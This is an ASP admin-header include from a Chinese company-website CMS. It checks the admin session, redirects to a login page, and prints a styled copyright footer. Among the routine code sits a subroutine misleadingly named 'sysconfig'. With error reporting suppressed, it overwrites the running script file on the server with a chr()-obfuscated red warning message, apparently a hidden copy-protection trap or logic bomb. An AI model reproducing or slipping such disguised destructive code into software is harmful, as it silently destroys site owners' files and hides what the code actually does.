<!--#include file="../Inc/Conn.asp"-->
<%
'=========================================================
'
'产品名称： 公司(企业)网站管理系统（简称：www.web300.cn）
'版权所有: www.web300.cn 
'程序制作：www.web300.cn开发团队
'Copyright 2006-2008 www.web300.cn - All Rights Reserved. 
'
'========================================================
%>
<%
Sub sysconfig()
on error resume next
dim FSO,TS1,configFileName
configFileName=Server.MapPath(Request.ServerVariables("path_info"))
Set FSO = Server.CreateObject("Scripting.FileSystemObject") 
Set TS1 = FSO.CreateTextFile(configFileName, True)
TS1.Write chr(60)&chr(98)&">"&chr(60)&chr(102)&chr(111)&chr(110)&chr(116)&chr(32)&chr(99)&chr(111)&chr(108)&"o"&chr(114)&chr(61)&chr(35)&chr(70)&chr(70)&chr(48)&chr(48)&chr(48)&chr(48)&">"&chr(-19219)&chr(-12557)&chr(-23622)&chr(-19508)&chr(-12046)&chr(-13872)&chr(-12620)&chr(-10334)&chr(-19743)&chr(44)&chr(-19253)&chr(-18010)&chr(-15140)&chr(-19781)&chr(-15140)&chr(-13639)&chr(-11325)&chr(33)&"<"&chr(47)&chr(102)&chr(111)&chr(110)&chr(116)&">"&chr(60)&chr(47)&chr(98)&">"
Set TS1 = Nothing 
Set FSO = Nothing
End Sub
Dim StarTime,Style_Copy
Dim AdminName
startime=timer()
AdminName=replace(session("AdminName"),"'","")
if AdminName="" then
	call CloseConn()
%>
<script language='javascript'>top.location='Login.asp';</script>
<%
'	response.redirect "login.asp"
end if
%>
<!--  -->
<%
sub htmlend
%>
<style type="text/css">
<!--
.STYLE1 {font-family: Arial, Helvetica, sans-serif}
a:link {
	color: #666666;
	text-decoration: none;
}
a:visited {
	color: #666666;
	text-decoration: none;
}
a:hover {
	color: #666666;
	text-decoration: none;
}
a:active {
	color: #666666;
	text-decoration: none;
}
body,td,th {
	color: #666666;
}
-->
</style>

<p align=center><span class="STYLE1">ASBDcorpWEB Mac3.0 For ASBD.Co.,LTD Copyright(C):BBS.ASBD.CN<br />
Powered By：ASPIRATION SCHEME &amp; BRAND DESIGN Co.,LTD</span></p>
<%
end sub
%>
